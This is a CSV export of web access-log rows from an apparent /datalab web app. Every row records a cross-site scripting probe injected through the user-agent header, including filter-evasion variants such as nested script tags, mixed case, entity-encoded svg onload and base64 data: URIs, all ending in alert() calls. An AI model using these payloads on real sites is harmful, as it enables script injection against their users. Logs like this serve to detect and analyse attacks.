"","X1","X2","X3","X4","X5","X6","X7","X8","X9","X10"
"541","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:41:14 +0000","GET / HTTP/1.1",200,1040,NA,"datalab #""><img src=M onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"542","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:41:15 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab #""><img src=M onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"543","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:41:15 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab #""><img src=M onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"544","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:43:15 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab #""><img src=M onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"545","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:45:16 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab #""><img src=M onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"546","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:45:40 +0000","GET / HTTP/1.1",200,1040,NA,"datalab element[attribute='<img src=x onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"547","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:45:41 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab element[attribute='<img src=x onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"548","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:45:42 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab element[attribute='<img src=x onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"549","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:47:41 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab element[attribute='<img src=x onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"550","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:49:42 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab element[attribute='<img src=x onerror=alert('XSS');> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"551","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:50:05 +0000","GET / HTTP/1.1",200,1040,NA,"datalab [<blockquote cite=""]"">[","onmouseover=""alert('RVRSH3LL_XSS');"""
"552","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:50:06 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab [<blockquote cite=""]"">[","onmouseover=""alert('RVRSH3LL_XSS');"""
"553","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:50:07 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab [<blockquote cite=""]"">[","onmouseover=""alert('RVRSH3LL_XSS');"""
"554","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:52:07 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab [<blockquote cite=""]"">[","onmouseover=""alert('RVRSH3LL_XSS');"""
"555","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:54:07 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab [<blockquote cite=""]"">[","onmouseover=""alert('RVRSH3LL_XSS');"""
"556","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:54:59 +0000","GET / HTTP/1.1",200,1040,NA,"datalab %22;alert%28%27RVRSH3LL_XSS%29// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","10975"
"557","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:00 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab %22;alert%28%27RVRSH3LL_XSS%29// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","9"
"558","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:01 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab %22;alert%28%27RVRSH3LL_XSS%29// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","745"
"559","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:03 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab %22;alert%28%27RVRSH3LL_XSS%29// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1672"
"560","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:04 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab %22;alert%28%27RVRSH3LL_XSS%29// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","18"
"561","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:04 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab %22;alert%28%27RVRSH3LL_XSS%29// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"562","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:26 +0000","GET / HTTP/1.1",200,1040,NA,"datalab javascript:alert%281%29; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"563","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:27 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab javascript:alert%281%29; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"564","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:27 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab javascript:alert%281%29; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"565","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:31 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab javascript:alert%281%29; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","23"
"566","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:31 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab javascript:alert%281%29; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"567","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:31 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab javascript:alert%281%29; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"568","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:55 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <w contenteditable id=x onfocus=alert()> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"569","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:55 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <w contenteditable id=x onfocus=alert()> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"570","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:56 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <w contenteditable id=x onfocus=alert()> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"571","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:58 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <w contenteditable id=x onfocus=alert()> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","508"
"572","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:58 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <w contenteditable id=x onfocus=alert()> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"573","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:55:58 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <w contenteditable id=x onfocus=alert()> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","10"
"574","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:18 +0000","GET / HTTP/1.1",200,1040,NA,"datalab alert;pg(""XSS"") Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"575","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:18 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab alert;pg(""XSS"") Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"576","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:19 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab alert;pg(""XSS"") Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"577","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:22 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab alert;pg(""XSS"") Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","595"
"578","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:23 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab alert;pg(""XSS"") Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"579","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:23 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab alert;pg(""XSS"") Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"580","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:40 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <svg/onload=%26%23097lert%26lpar;1337)> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"581","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:40 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <svg/onload=%26%23097lert%26lpar;1337)> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"582","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:42 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <svg/onload=%26%23097lert%26lpar;1337)> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1957"
"583","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:45 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <svg/onload=%26%23097lert%26lpar;1337)> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","646"
"584","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:45 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <svg/onload=%26%23097lert%26lpar;1337)> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"585","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:56:46 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <svg/onload=%26%23097lert%26lpar;1337)> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"586","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:02 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <script>for((i)in(self))eval(i)(1)</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1259"
"587","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:02 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <script>for((i)in(self))eval(i)(1)</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"588","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:03 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <script>for((i)in(self))eval(i)(1)</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"589","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:06 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <script>for((i)in(self))eval(i)(1)</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1022"
"590","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:06 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <script>for((i)in(self))eval(i)(1)</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"591","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:06 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <script>for((i)in(self))eval(i)(1)</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"592","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:21 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"593","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:21 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"594","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:22 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","12"
"595","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:23 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","8"
"596","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:23 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"597","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:23 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","10"
"598","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:39 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <sCR<script>iPt>alert(1)</SCr</script>IPt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"599","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:39 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <sCR<script>iPt>alert(1)</SCr</script>IPt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"600","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:39 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <sCR<script>iPt>alert(1)</SCr</script>IPt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"601","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:40 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <sCR<script>iPt>alert(1)</SCr</script>IPt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","97"
"602","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:40 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <sCR<script>iPt>alert(1)</SCr</script>IPt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"603","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:40 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <sCR<script>iPt>alert(1)</SCr</script>IPt> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","8"
"604","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:57:59 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"605","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:58:01 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"606","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:58:01 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","7"
"607","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:58:04 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","648"
"608","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:58:05 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"609","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:58:05 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","8"
